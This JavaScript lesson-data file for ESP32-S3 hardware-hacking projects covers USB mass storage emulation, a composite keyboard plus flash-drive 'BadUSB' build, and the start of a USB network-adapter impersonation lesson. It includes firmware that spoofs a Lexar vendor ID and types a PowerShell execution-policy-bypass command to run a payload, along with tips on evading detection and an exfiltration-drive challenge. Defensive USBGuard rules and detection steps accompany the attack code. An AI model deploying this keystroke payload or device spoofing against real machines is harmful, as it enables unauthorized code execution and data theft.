                     '<p><strong>Safety:</strong> Disconnect USB before wiring the SD breakout. The SD module runs on 3.3V &mdash; do not connect to 5V.</p>' +
                     '<p><strong>Authorization:</strong> A device that presents as a USB flash drive can auto-deliver files to a target. Only deploy in authorized testing scenarios. Auto-run is disabled on modern operating systems but social engineering ("open the file") remains effective.</p>',

        wiringSvg: '<div class="svg-build-wrap">' +
            '<svg viewBox="0 0 720 400" xmlns="http://www.w3.org/2000/svg" style="font-family:Cascadia Code,Fira Code,Consolas,monospace">' +
            '<defs>' +
            '<pattern id="sg107-grid" width="20" height="20" patternUnits="userSpaceOnUse"><circle cx="10" cy="10" r="1" fill="rgba(255,255,255,0.04)"/></pattern>' +
            '<style>' +
            '@keyframes sg107-dataflow{0%{stroke-dashoffset:20}100%{stroke-dashoffset:0}}' +
            '</style>' +
            '</defs>' +
            '<rect width="720" height="400" fill="#0d1117" rx="8"/>' +
            '<rect x="10" y="10" width="700" height="380" fill="url(#sg107-grid)" rx="4"/>' +
            '<text x="360" y="28" text-anchor="middle" fill="#555" font-size="10" letter-spacing="0.15em">SG-107 USB MASS STORAGE EMULATION</text>' +

            '<!-- T-Display-S3 Board -->' +
            '<rect x="40" y="55" width="240" height="190" rx="12" fill="#1e2736" stroke="#a855f7" stroke-width="2"/>' +
            '<rect x="40" y="55" width="240" height="28" rx="12" fill="rgba(168,85,247,0.12)"/>' +
            '<text x="160" y="74" text-anchor="middle" fill="#c084fc" font-size="11" font-weight="700">LILYGO T-Display-S3</text>' +
            '<!-- TFT -->' +
            '<rect x="55" y="95" width="90" height="120" rx="6" fill="#0a1628" stroke="#3b82f6" stroke-width="1.5"/>' +
            '<text x="100" y="112" text-anchor="middle" fill="#60a5fa" font-size="7" font-weight="600">USB STORAGE</text>' +
            '<text x="65" y="128" fill="#8b949e" font-size="6">HEXWRTH S3-ARSENAL</text>' +
            '<text x="65" y="142" fill="#8b949e" font-size="6">Size: 2MB drive</text>' +
            '<text x="65" y="156" fill="#22c55e" font-size="6">Status: MOUNTED</text>' +
            '<text x="65" y="170" fill="#eab308" font-size="6">Mode: Read-Only</text>' +
            '<text x="65" y="190" fill="#8b949e" font-size="5">Files served from SPIFFS</text>' +
            '<!-- ESP32-S3 -->' +
            '<rect x="170" y="100" width="90" height="40" rx="6" fill="rgba(168,85,247,0.1)" stroke="#a855f7" stroke-width="1"/>' +
            '<text x="215" y="118" text-anchor="middle" fill="#c084fc" font-size="7" font-weight="700">ESP32-S3</text>' +
            '<text x="215" y="132" text-anchor="middle" fill="#8b949e" font-size="6">TinyUSB MSC</text>' +
            '<!-- SPIFFS flash -->' +
            '<rect x="170" y="150" width="90" height="32" rx="4" fill="rgba(234,179,8,0.08)" stroke="#eab308" stroke-width="1"/>' +
            '<text x="215" y="166" text-anchor="middle" fill="#eab308" font-size="7" font-weight="600">SPIFFS</text>' +
            '<text x="215" y="178" text-anchor="middle" fill="#8b949e" font-size="6">16MB Flash</text>' +
            '<!-- Pins for SD card -->' +
            '<text x="270" y="120" text-anchor="start" fill="#8b949e" font-size="7">GPIO 13</text>' +
            '<circle cx="268" cy="117" r="2.5" fill="#1a1f2b" stroke="#22c55e" stroke-width="1"/>' +
            '<text x="270" y="135" text-anchor="start" fill="#8b949e" font-size="7">GPIO 11</text>' +
            '<circle cx="268" cy="132" r="2.5" fill="#1a1f2b" stroke="#f97316" stroke-width="1"/>' +
            '<text x="270" y="150" text-anchor="start" fill="#8b949e" font-size="7">GPIO 12</text>' +
            '<circle cx="268" cy="147" r="2.5" fill="#1a1f2b" stroke="#eab308" stroke-width="1"/>' +
            '<text x="270" y="165" text-anchor="start" fill="#8b949e" font-size="7">GPIO 10</text>' +
            '<circle cx="268" cy="162" r="2.5" fill="#1a1f2b" stroke="#3b82f6" stroke-width="1"/>' +
            '<text x="270" y="180" text-anchor="start" fill="#8b949e" font-size="7">3V3</text>' +
            '<circle cx="268" cy="177" r="2.5" fill="#1a1f2b" stroke="#ef4444" stroke-width="1"/>' +
            '<text x="270" y="195" text-anchor="start" fill="#8b949e" font-size="7">GND</text>' +
            '<circle cx="268" cy="192" r="2.5" fill="#1a1f2b" stroke="#8b949e" stroke-width="1"/>' +
            '<!-- USB-C -->' +
            '<rect x="135" y="233" width="50" height="14" rx="4" fill="#333" stroke="#8b949e" stroke-width="1"/>' +
            '<text x="160" y="260" text-anchor="middle" fill="#8b949e" font-size="7">USB-C</text>' +

            '<!-- MicroSD Breakout Module (optional) -->' +
            '<rect x="430" y="55" width="150" height="190" rx="8" fill="#1e2736" stroke="#22c55e" stroke-width="1.5"/>' +
            '<rect x="430" y="55" width="150" height="24" rx="8" fill="rgba(34,197,94,0.12)"/>' +
            '<rect x="430" y="71" width="150" height="8" fill="rgba(34,197,94,0.12)"/>' +
            '<text x="505" y="71" text-anchor="middle" fill="#4ade80" font-size="9" font-weight="600">MICROSD MODULE</text>' +
            '<text x="505" y="91" text-anchor="middle" fill="#8b949e" font-size="7">(optional)</text>' +
            '<!-- SD card slot -->' +
            '<rect x="455" y="105" width="100" height="50" rx="4" fill="rgba(34,197,94,0.06)" stroke="rgba(34,197,94,0.2)" stroke-width="0.5"/>' +
            '<text x="505" y="128" text-anchor="middle" fill="#22c55e" font-size="8">SD Card Slot</text>' +
            '<text x="505" y="142" text-anchor="middle" fill="#8b949e" font-size="6">FAT32 formatted</text>' +
            '<!-- SD module pins -->' +
            '<rect x="445" y="168" width="36" height="14" rx="2" fill="rgba(239,68,68,0.1)" stroke="rgba(239,68,68,0.3)" stroke-width="0.5"/>' +
            '<text x="463" y="178" text-anchor="middle" fill="#ef4444" font-size="6">VCC</text>' +
            '<rect x="445" y="186" width="36" height="14" rx="2" fill="rgba(139,148,158,0.1)" stroke="rgba(139,148,158,0.3)" stroke-width="0.5"/>' +
            '<text x="463" y="196" text-anchor="middle" fill="#8b949e" font-size="6">GND</text>' +
            '<rect x="445" y="204" width="36" height="14" rx="2" fill="rgba(34,197,94,0.1)" stroke="rgba(34,197,94,0.3)" stroke-width="0.5"/>' +
            '<text x="463" y="214" text-anchor="middle" fill="#22c55e" font-size="6">MISO</text>' +
            '<rect x="515" y="168" width="36" height="14" rx="2" fill="rgba(249,115,22,0.1)" stroke="rgba(249,115,22,0.3)" stroke-width="0.5"/>' +
            '<text x="533" y="178" text-anchor="middle" fill="#fb923c" font-size="6">MOSI</text>' +
            '<rect x="515" y="186" width="36" height="14" rx="2" fill="rgba(234,179,8,0.1)" stroke="rgba(234,179,8,0.3)" stroke-width="0.5"/>' +
            '<text x="533" y="196" text-anchor="middle" fill="#eab308" font-size="6">SCK</text>' +
            '<rect x="515" y="204" width="36" height="14" rx="2" fill="rgba(59,130,246,0.1)" stroke="rgba(59,130,246,0.3)" stroke-width="0.5"/>' +
            '<text x="533" y="214" text-anchor="middle" fill="#60a5fa" font-size="6">CS</text>' +

            '<!-- SPI Wires from board to SD module -->' +
            '<line x1="271" y1="117" x2="445" y2="210" stroke="#22c55e" stroke-width="1.5" stroke-dasharray="6,3" style="animation:sg107-dataflow 1s linear infinite"/>' +
            '<line x1="271" y1="132" x2="515" y2="175" stroke="#f97316" stroke-width="1.5" stroke-dasharray="6,3" style="animation:sg107-dataflow 1s linear infinite"/>' +
            '<line x1="271" y1="147" x2="515" y2="193" stroke="#eab308" stroke-width="1.5" stroke-dasharray="6,3" style="animation:sg107-dataflow 1s linear infinite"/>' +
            '<line x1="271" y1="162" x2="515" y2="211" stroke="#3b82f6" stroke-width="1.5" stroke-dasharray="6,3" style="animation:sg107-dataflow 1s linear infinite"/>' +
            '<line x1="271" y1="177" x2="445" y2="175" stroke="#ef4444" stroke-width="1.5"/>' +
            '<line x1="271" y1="192" x2="445" y2="193" stroke="#8b949e" stroke-width="1.5" stroke-dasharray="4,3"/>' +

            '<!-- Target PC -->' +
            '<rect x="40" y="290" width="260" height="70" rx="8" fill="#1e2736" stroke="#3b82f6" stroke-width="1.5"/>' +
            '<rect x="40" y="290" width="260" height="20" rx="8" fill="rgba(59,130,246,0.12)"/>' +
            '<text x="170" y="305" text-anchor="middle" fill="#60a5fa" font-size="9" font-weight="600">TARGET PC</text>' +
            '<text x="50" y="326" fill="#8b949e" font-size="7">Sees: Removable Drive (E:)</text>' +
            '<text x="50" y="342" fill="#8b949e" font-size="7">Vendor: HEXWRTH | Product: S3-ARSENAL</text>' +
            '<text x="50" y="354" fill="#ef4444" font-size="7">No driver install needed &#8212; OS trusts USB MSC</text>' +
            '<!-- USB cable to PC -->' +
            '<path d="M160,260 C160,275 160,280 160,290" stroke="#3b82f6" stroke-width="2"/>' +
            '<text x="170" y="280" fill="#60a5fa" font-size="6">USB-C</text>' +

            '<!-- Wire legend -->' +
            '<rect x="430" y="260" width="250" height="104" rx="6" fill="rgba(59,130,246,0.04)" stroke="rgba(59,130,246,0.15)" stroke-width="0.5"/>' +
            '<text x="440" y="278" fill="#60a5fa" font-size="8" font-weight="600">SPI WIRING (optional SD)</text>' +
            '<line x1="440" y1="292" x2="460" y2="292" stroke="#22c55e" stroke-width="2"/>' +
            '<text x="466" y="295" fill="#8b949e" font-size="7">MISO &#8594; GPIO 13</text>' +
            '<line x1="440" y1="307" x2="460" y2="307" stroke="#f97316" stroke-width="2"/>' +
            '<text x="466" y="310" fill="#8b949e" font-size="7">MOSI &#8594; GPIO 11</text>' +
            '<line x1="440" y1="322" x2="460" y2="322" stroke="#eab308" stroke-width="2"/>' +
            '<text x="466" y="325" fill="#8b949e" font-size="7">SCK &#8594; GPIO 12</text>' +
            '<line x1="440" y1="337" x2="460" y2="337" stroke="#3b82f6" stroke-width="2"/>' +
            '<text x="466" y="340" fill="#8b949e" font-size="7">CS &#8594; GPIO 10</text>' +
            '<line x1="440" y1="352" x2="460" y2="352" stroke="#ef4444" stroke-width="2"/>' +
            '<text x="466" y="355" fill="#8b949e" font-size="7">VCC &#8594; 3V3 (NOT 5V!)</text>' +

            '</svg>' +
            '</div>',

        steps: [
            {
                title: 'TinyUSB Mass Storage Setup',
                content: '<p>Configure the ESP32-S3 to present as a USB mass storage device using TinyUSB. The host computer will see a new removable drive.</p>',
                code: '#include "USB.h"\n#include "USBMSC.h"\n#include <SPIFFS.h>\n#include <TFT_eSPI.h>\n\nTFT_eSPI tft = TFT_eSPI();\nUSBMSC msc;\n\n// SPIFFS-backed mass storage callbacks\nstatic int32_t onRead(uint32_t lba, uint32_t offset, void* buffer, uint32_t bufsize) {\n    // STUB: Returns zeros. Host sees unformatted drive.\n    // See Challenge 1 (FAT12) for a working filesystem.\n    // In production, this maps LBA to a disk image file\n    memset(buffer, 0, bufsize);\n    return bufsize;\n}\n\nstatic int32_t onWrite(uint32_t lba, uint32_t offset, uint8_t* buffer, uint32_t bufsize) {\n    // Write to SPIFFS image (read-only for safety)\n    return bufsize;  // Accept but discard writes\n}\n\nstatic bool onStartStop(uint8_t power, bool start, bool loadEject) {\n    if (loadEject) {\n        // Host ejected the drive\n        tft.setCursor(5, 130);\n        tft.setTextColor(TFT_YELLOW, TFT_BLACK);\n        tft.println("Drive ejected by host");\n    }\n    return true;\n}\n\nvoid setup() {\n    tft.init();\n    tft.setRotation(1);\n    pinMode(TFT_BL, OUTPUT);\n    digitalWrite(TFT_BL, HIGH);\n    tft.fillScreen(TFT_BLACK);\n    \n    SPIFFS.begin(true);\n    \n    // Configure MSC\n    msc.vendorID("HEXWRTH");\n    msc.productID("S3-ARSENAL");\n    msc.productRevision("1.0");\n    msc.onRead(onRead);\n    msc.onWrite(onWrite);\n    msc.onStartStop(onStartStop);\n    msc.mediaPresent(true);\n    msc.begin(4096, 512);  // 4096 blocks x 512 bytes = 2MB drive\n    \n    USB.begin();\n    \n    tft.setTextColor(TFT_CYAN, TFT_BLACK);\n    tft.setTextSize(2);\n    tft.setCursor(10, 20);\n    tft.println("USB STORAGE");\n    tft.setTextSize(1);\n    tft.setCursor(10, 60);\n    tft.println("Host sees: HEXWRTH S3-ARSENAL");\n    tft.println("Size: 2MB removable drive");\n    tft.println("Mode: Read-only");\n    tft.setTextColor(0x07E0, TFT_BLACK);\n    tft.setCursor(10, 110);\n    tft.println("Status: MOUNTED");\n}',
                language: 'C++',
                tip: '<strong>vendorID and productID</strong> are the strings the host shows in Device Manager / lsusb. You can set these to anything &mdash; including mimicking a legitimate USB drive brand. This is how malicious USB devices evade detection by appearing as known-good hardware.'
            },
            {
                title: 'Composite Device — HID + Mass Storage',
                content: '<p>The real power: present as BOTH a keyboard AND a flash drive simultaneously. The keyboard types commands that reference files on the drive. This is the BadUSB technique used by professional assessment tools.</p>' +
                         '<p>Example: the keyboard opens PowerShell, the command reads a script from the USB drive, and executes it &mdash; all in under 3 seconds.</p>',
                code: '#include "USB.h"\n#include "USBMSC.h"\n#include "USBHIDKeyboard.h"\n\nUSBMSC msc;\nUSBHIDKeyboard Keyboard;\n\n// Initialize both USB classes\nvoid setup() {\n    // ... display init ...\n    \n    // Setup MSC (flash drive)\n    msc.vendorID("LEXAR");\n    msc.productID("USB3.0");\n    msc.productRevision("2.0");\n    msc.onRead(onRead);\n    msc.onWrite(onWrite);\n    msc.mediaPresent(true);\n    msc.begin(4096, 512);\n    \n    // Setup HID (keyboard)\n    Keyboard.begin();\n    \n    // Start composite USB device\n    USB.begin();\n    // Host now sees: 1 keyboard + 1 removable drive\n    \n    tft.setCursor(10, 80);\n    tft.println("Composite device active:");\n    tft.println("  [1] USB Keyboard (HID)");\n    tft.println("  [2] USB Drive (MSC)");\n    tft.println("");\n    tft.setTextColor(TFT_RED, TFT_BLACK);\n    tft.println("Both active simultaneously");\n}\n\n// Example composite attack payload:\n// 1. Keyboard opens Run dialog\n// 2. Keyboard types command to execute script from the USB drive\n// 3. Script runs with logged-in user privileges\nvoid compositePayload() {\n    delay(2000);  // Wait for drive to mount\n    \n    // Open PowerShell\n    Keyboard.press(KEY_LEFT_GUI);\n    Keyboard.press(\'r\');\n    Keyboard.releaseAll();\n    delay(500);\n    \n    // Execute script from the USB drive\n    // The drive letter varies — a real tool would detect it\n    Keyboard.println("powershell -ep bypass -file D:\\\\payload.ps1");\n}',
                language: 'C++',
                tip: '<strong>Composite USB devices</strong> present multiple interfaces simultaneously. One USB connector, multiple device classes. The host sees each interface as a separate device. This is standard USB behavior &mdash; many legitimate devices do this (keyboard + media keys, printer + scanner). The security implication: you cannot trust a USB device to be ONLY what it claims to be.'
            },
            {
                title: 'Defense: Detecting Composite USB Devices',
                content: '<p>Teach the defense alongside the technique. How to detect a suspicious USB device that presents as both a keyboard and a storage device:</p>' +
                         '<ul>' +
                         '<li><strong>USB descriptor inspection:</strong> Real flash drives have 1 interface (MSC). A composite HID+MSC device has 2+ interfaces. This is abnormal for a "flash drive."</li>' +
                         '<li><strong>USBGuard rules:</strong> On Linux, block devices with multiple interface classes unless whitelisted.</li>' +
                         '<li><strong>Windows Group Policy:</strong> Restrict removable storage AND require known HID device VID/PID.</li>' +
                         '<li><strong>Endpoint detection:</strong> EDR agents can detect new HID devices and correlate with mass storage events.</li>' +
                         '</ul>',
                code: '# Linux: Detect composite USB devices\n# List all USB devices and their interface classes:\nlsusb -v 2>/dev/null | grep -A 5 "bInterfaceClass"\n\n# A legitimate flash drive shows:\n#   bInterfaceClass  8 Mass Storage\n# A suspicious composite device shows:\n#   bInterfaceClass  3 Human Interface Device\n#   bInterfaceClass  8 Mass Storage\n\n# USBGuard rule to block composite HID+MSC:\n# /etc/usbguard/rules.conf\nblock with-interface one-of { 03:*:* 08:*:* }  # Block HID+MSC combo\nallow with-interface equals { 08:*:* }          # Allow pure MSC\nallow with-interface equals { 03:01:01 }        # Allow standard keyboards',
                language: 'Bash',
                tip: '<strong>The detection principle:</strong> legitimate USB flash drives never have a HID interface. Legitimate keyboards never have an MSC interface. A device with both is either a specialized tool (security assessment device) or malicious. Flag and investigate.'
            }
        ],

        testing: '<p>Verify:</p>' +
                 '<ul>' +
                 '<li><strong>Mass Storage:</strong> Plug in the board. A new removable drive appears in File Explorer (Windows) or Finder (macOS). It should show as "HEXWRTH S3-ARSENAL".</li>' +
                 '<li><strong>Composite mode:</strong> Device Manager shows both "HID Keyboard" and "USB Mass Storage" from the same device.</li>' +
                 '<li><strong>Read-only:</strong> Try to write a file to the drive. It should fail or silently discard the write.</li>' +
                 '<li><strong>Eject detection:</strong> Safely eject the drive from the host. The display should show "Drive ejected by host".</li>' +
                 '<li><strong>Linux detection:</strong> Run <code>lsusb -v</code> and verify you can see both interface classes on the device.</li>' +
                 '</ul>',

        troubleshooting: '<ul>' +
                         '<li><strong>Drive not appearing on host:</strong> Make sure <code>msc.mediaPresent(true)</code> is called before <code>msc.begin()</code>. Without it, the host sees an empty drive bay.</li>' +
                         '<li><strong>Drive appears but is 0 bytes:</strong> Check the block count and block size in <code>msc.begin(blocks, blockSize)</code>. The total size is blocks x blockSize.</li>' +
                         '<li><strong>Cannot use HID and MSC simultaneously:</strong> Both must be initialized before <code>USB.begin()</code>. Starting USB before adding all classes will not work.</li>' +
                         '<li><strong>Host assigns wrong drive letter:</strong> The drive letter is assigned by the host OS. You cannot control it from the device. Your payload must either detect the drive letter or use a path-independent method.</li>' +
                         '</ul>',

        challenges: '<p><strong>Challenge 1: FAT12 Filesystem</strong> &mdash; Implement a minimal FAT12 filesystem in the read callback so the host sees actual files (README.txt, payload.ps1) instead of raw blocks. This is how commercial BadUSB devices serve files.</p>' +
                    '<p><strong>Challenge 2: Exfiltration Drive</strong> &mdash; In write mode, accept files written by the host and store them in SPIFFS or SD card. This turns the device into a covert data exfiltration tool. Discuss the defense: USB DLP (Data Loss Prevention) policies.</p>' +
                    '<p><strong>Challenge 3: Auto-Detect Drive Letter</strong> &mdash; When the HID keyboard opens a command prompt, use a script that finds the correct drive letter by looking for your device vendor string in <code>wmic logicaldisk</code> output. This makes the payload portable across any machine.</p>',

        stepVisuals: {},
        componentCallouts: { svg: '', components: [{ id: 't-display-s3', name: 'LILYGO T-Display-S3', purpose: 'ESP32-S3 native USB presents as Mass Storage Class device. SPIFFS flash stores files served to the host. Combined with HID for composite BadUSB technique.', specs: ['TinyUSB MSC Class 0x08', 'SPIFFS: ~4MB', 'Composite: HID + MSC', 'Custom VID/PID'] }, { id: 'sd-breakout', name: 'MicroSD Breakout (Optional)', purpose: 'Adds removable storage for larger payloads and file delivery. SPI interface to ESP32-S3.', specs: ['SPI interface', '3.3V only', 'FAT32 format', '~$3'] }] },
        commonMistakes: [
            { title: 'Connecting SD Module to 5V', correct: 'Connect SD breakout VCC to the 3.3V pin on the T-Display-S3. SD cards operate at 3.3V logic levels.', incorrect: 'Connecting SD module VCC to 5V or VBUS.', consequence: 'The SD card and/or the level shifter on the breakout board can be permanently damaged. Some modules have onboard regulators that tolerate 5V, but many do not. Always check the module datasheet.' },
            { title: 'Initializing USB After Adding Only One Class', correct: 'Initialize ALL USB classes (HID, MSC, etc.) BEFORE calling <code>USB.begin()</code>. The USB stack configures all descriptors at begin() time.', incorrect: 'Calling <code>USB.begin()</code> after setting up MSC, then trying to add HID later.', consequence: 'The second USB class is not registered in the USB descriptors. The host only sees the first class. No error is thrown &mdash; the second class silently fails.' },
            { title: 'Setting Drive to Read-Write Without Understanding the Risk', correct: 'Start with read-only mode. Only enable writes when you have a specific, authorized reason (e.g., testing USB DLP policies). Log all write operations.', incorrect: 'Setting the drive to read-write by default and allowing arbitrary file writes to the ESP32-S3 storage.', consequence: 'The host OS (or malware on the host) writes to your device, potentially corrupting SPIFFS, filling flash storage, or overwriting your payload files.' }
        ]
    }
,

    // ========================================================================
    // SG-108: Network Adapter Impersonation (USB RNDIS/ECM)
    // ========================================================================
    'sg-108': {
        // Wokwi wave 2: NO SIM — T-Display-S3 unsupported + offensive USB/BLE/RF features not in Wokwi.
        simulator: { available: false, note: 'Network interface impersonation manipulates the real <strong>WiFi/MAC layer</strong> (spoofing, raw frames). Wokwi&#39;s WiFi model is high-level and doesn&#39;t expose this, so the build requires the physical radio.' },
        intro: '<p>The ESP32-S3 can present as a USB network adapter to any computer it plugs into. The host operating system sees a new Ethernet interface, assigns it an IP via DHCP (served by the ESP32-S3), and begins routing traffic through it. This gives the device the ability to intercept, modify, or redirect network traffic.</p>' +
               '<p>This is how devices like the LAN Turtle and PoisonTap work. The host trusts USB network adapters implicitly &mdash; no driver installation is needed on modern operating systems.</p>' +
               '<p>This project is a conceptual reference using ESP-IDF APIs. The Arduino framework does not natively support USB RNDIS. For a working implementation, use ESP-IDF with the TinyUSB net driver example. In this guide you will understand how a device appears as a network adapter, serve DHCP, intercept DNS queries, and understand how to detect and defend against USB network impersonation.</p>',

        wiring: '    No external wiring required.\n    T-Display-S3 only.\n    USB-C connection to target machine.',

        wiringNotes: '<p><strong>No external wiring.</strong> The USB connection carries both the network data and power.</p>' +
                     '<p><strong>Authorization:</strong> USB network impersonation intercepts traffic. Only use on systems you own or have explicit written authorization to test. This technique can capture credentials, session tokens, and sensitive data in transit.</p>' +
                     '<p><strong>Safety:</strong> This device modifies the target machine network routing. Always test on an isolated system first. Incorrect DHCP configuration can disrupt the target network connectivity.</p>',

        wiringSvg: '<div class="svg-build-wrap">' +
            '<svg viewBox="0 0 720 400" xmlns="http://www.w3.org/2000/svg" style="font-family:Cascadia Code,Fira Code,Consolas,monospace">' +
            '<defs>' +
            '<pattern id="sg108-grid" width="20" height="20" patternUnits="userSpaceOnUse"><circle cx="10" cy="10" r="1" fill="rgba(255,255,255,0.04)"/></pattern>' +
            '<style>' +
            '@keyframes sg108-flow{0%{stroke-dashoffset:16}100%{stroke-dashoffset:0}}' +
            '@keyframes sg108-intercept{0%,100%{opacity:0.3}50%{opacity:1}}' +
            '</style>' +
            '</defs>' +
            '<rect width="720" height="400" fill="#0d1117" rx="8"/>' +
            '<rect x="10" y="10" width="700" height="380" fill="url(#sg108-grid)" rx="4"/>' +
            '<text x="360" y="28" text-anchor="middle" fill="#555" font-size="10" letter-spacing="0.15em">SG-108 NETWORK ADAPTER IMPERSONATION</text>' +

            '<!-- T-Display-S3 (Network Implant) -->' +
            '<rect x="250" y="50" width="220" height="160" rx="12" fill="#1e2736" stroke="#ef4444" stroke-width="2"/>' +
            '<rect x="250" y="50" width="220" height="28" rx="12" fill="rgba(239,68,68,0.12)"/>' +
            '<text x="360" y="69" text-anchor="middle" fill="#ef4444" font-size="11" font-weight="700">T-Display-S3</text>' +
            '<text x="360" y="84" text-anchor="middle" fill="#fb923c" font-size="7">USB RNDIS / CDC-ECM</text>' +
            '<!-- TFT -->' +
            '<rect x="265" y="95" width="80" height="95" rx="5" fill="#0a1628" stroke="#3b82f6" stroke-width="1"/>' +
            '<text x="305" y="110" text-anchor="middle" fill="#ef4444" font-size="7" font-weight="600">NET IMPLANT</text>' +
            '<text x="275" y="126" fill="#60a5fa" font-size="5">Dev: 172.16.0.1</text>' +
            '<text x="275" y="138" fill="#60a5fa" font-size="5">Host: 172.16.0.2</text>' +
            '<text x="275" y="150" fill="#eab308" font-size="5">DNS: This device</text>' +
            '<text x="275" y="164" fill="#22c55e" font-size="5">Status: ACTIVE</text>' +
            '<!-- ESP32-S3 chip -->' +
            '<rect x="365" y="100" width="88" height="40" rx="5" fill="rgba(168,85,247,0.1)" stroke="#a855f7" stroke-width="1"/>' +
            '<text x="409" y="118" text-anchor="middle" fill="#c084fc" font-size="7" font-weight="700">ESP32-S3</text>' +
            '<text x="409" y="132" text-anchor="middle" fill="#8b949e" font-size="6">TinyUSB Net</text>' +
            '<!-- Services -->' +
            '<rect x="365" y="148" width="88" height="44" rx="4" fill="rgba(239,68,68,0.06)" stroke="rgba(239,68,68,0.15)" stroke-width="0.5"/>' +
            '<text x="409" y="162" text-anchor="middle" fill="#ef4444" font-size="6" font-weight="600">SERVICES</text>' +
            '<text x="375" y="174" fill="#8b949e" font-size="5">DHCP Server</text>' +
            '<text x="375" y="184" fill="#8b949e" font-size="5">DNS Interceptor</text>' +
            '<!-- USB-C port -->' +
            '<rect x="335" y="198" width="50" height="14" rx="4" fill="#333" stroke="#8b949e" stroke-width="1"/>' +

            '<!-- USB Cable (animated data flow) -->' +
            '<path d="M360,212 L360,260" stroke="#ef4444" stroke-width="3" stroke-dasharray="4,4" style="animation:sg108-flow 0.8s linear infinite"/>' +
            '<text x="375" y="240" fill="#ef4444" font-size="6" style="animation:sg108-intercept 1.5s ease-in-out infinite">USB-C</text>' +

            '<!-- Target PC -->' +
            '<rect x="250" y="265" width="220" height="100" rx="8" fill="#1e2736" stroke="#3b82f6" stroke-width="1.5"/>' +
            '<rect x="250" y="265" width="220" height="24" rx="8" fill="rgba(59,130,246,0.12)"/>' +
            '<rect x="250" y="281" width="220" height="8" fill="rgba(59,130,246,0.12)"/>' +
            '<text x="360" y="281" text-anchor="middle" fill="#60a5fa" font-size="10" font-weight="600">TARGET PC</text>' +
            '<text x="260" y="304" fill="#8b949e" font-size="7">Sees: New Ethernet adapter</text>' +
            '<text x="260" y="318" fill="#8b949e" font-size="7">IP: 172.16.0.2 (via DHCP)</text>' +
            '<text x="260" y="332" fill="#8b949e" font-size="7">Gateway: 172.16.0.1 (ESP32-S3)</text>' +
            '<text x="260" y="346" fill="#ef4444" font-size="7">DNS: 172.16.0.1 (intercepted!)</text>' +
            '<text x="260" y="360" fill="#8b949e" font-size="6">No driver install &#8212; OS trusts RNDIS/ECM</text>' +

            '<!-- Left: Attack flow -->' +
            '<rect x="30" y="50" width="190" height="160" rx="8" fill="rgba(239,68,68,0.04)" stroke="rgba(239,68,68,0.15)" stroke-width="0.5"/>' +
            '<text x="125" y="70" text-anchor="middle" fill="#ef4444" font-size="9" font-weight="600">ATTACK FLOW</text>' +
            '<text x="40" y="90" fill="#8b949e" font-size="7">1. Plug in USB-C</text>' +
            '<text x="40" y="108" fill="#8b949e" font-size="7">2. Host auto-detects adapter</text>' +
            '<text x="40" y="126" fill="#8b949e" font-size="7">3. ESP32 serves DHCP</text>' +
            '<text x="40" y="144" fill="#8b949e" font-size="7">4. Host gets IP + gateway</text>' +
            '<text x="40" y="162" fill="#ef4444" font-size="7">5. DNS routes through ESP32</text>' +
            '<text x="40" y="180" fill="#ef4444" font-size="7">6. Redirect, intercept, log</text>' +
            '<text x="40" y="198" fill="#8b949e" font-size="6" font-style="italic">Total time: ~3 seconds</text>' +

            '<!-- Right: Defense -->' +
            '<rect x="500" y="50" width="190" height="160" rx="8" fill="rgba(34,197,94,0.04)" stroke="rgba(34,197,94,0.15)" stroke-width="0.5"/>' +
            '<text x="595" y="70" text-anchor="middle" fill="#22c55e" font-size="9" font-weight="600">DEFENSE</text>' +
            '<text x="510" y="90" fill="#8b949e" font-size="7">USB device allow-listing</text>' +
            '<text x="510" y="108" fill="#8b949e" font-size="7">Disable USB auto-DHCP</text>' +
            '<text x="510" y="126" fill="#8b949e" font-size="7">Interface metric priority</text>' +
            '<text x="510" y="144" fill="#8b949e" font-size="7">DoH bypasses port 53 DNS</text>' +
            '<text x="510" y="162" fill="#8b949e" font-size="7">Endpoint detection (EDR)</text>' +
            '<text x="510" y="180" fill="#22c55e" font-size="7">Monitor new interfaces</text>' +

            '<!-- DoH bypass callout -->' +
            '<rect x="500" y="265" width="190" height="100" rx="6" fill="rgba(234,179,8,0.06)" stroke="rgba(234,179,8,0.2)" stroke-width="0.5"/>' +
            '<text x="510" y="285" fill="#eab308" font-size="8" font-weight="600">DoH LIMITATION</text>' +
            '<text x="510" y="302" fill="#8b949e" font-size="7">Modern browsers use DNS-</text>' +
            '<text x="510" y="316" fill="#8b949e" font-size="7">over-HTTPS (port 443)</text>' +
            '<text x="510" y="330" fill="#8b949e" font-size="7">Port 53 interception only</text>' +
            '<text x="510" y="344" fill="#8b949e" font-size="7">catches legacy/system DNS</text>' +
            '<text x="510" y="358" fill="#eab308" font-size="6" font-style="italic">Chrome, Firefox, Edge = DoH</text>' +

            '<!-- No wiring note -->' +
            '<rect x="30" y="265" width="190" height="60" rx="6" fill="rgba(34,197,94,0.06)" stroke="rgba(34,197,94,0.2)" stroke-width="0.5"/>' +
            '<text x="40" y="285" fill="#4ade80" font-size="8" font-weight="600">NO EXTERNAL WIRING</text>' +
            '<text x="40" y="302" fill="#8b949e" font-size="7">USB-C carries power + data</text>' +
            '<text x="40" y="316" fill="#8b949e" font-size="7">Conceptual &#8212; uses ESP-IDF</text>' +

            '</svg>' +
            '</div>',

        steps: [
            {
                title: 'USB RNDIS Network Adapter Setup',
                content: '<p>RNDIS (Remote Network Driver Interface Specification) is a Microsoft protocol that allows USB devices to present as network adapters. Windows supports it natively. Linux and macOS use CDC-ECM (Communications Device Class &mdash; Ethernet Control Model) which is the open standard equivalent.</p>' +
                         '<p>The ESP32-S3 TinyUSB stack supports both RNDIS and CDC-ECM. We configure it to present as a USB Ethernet adapter.</p>',
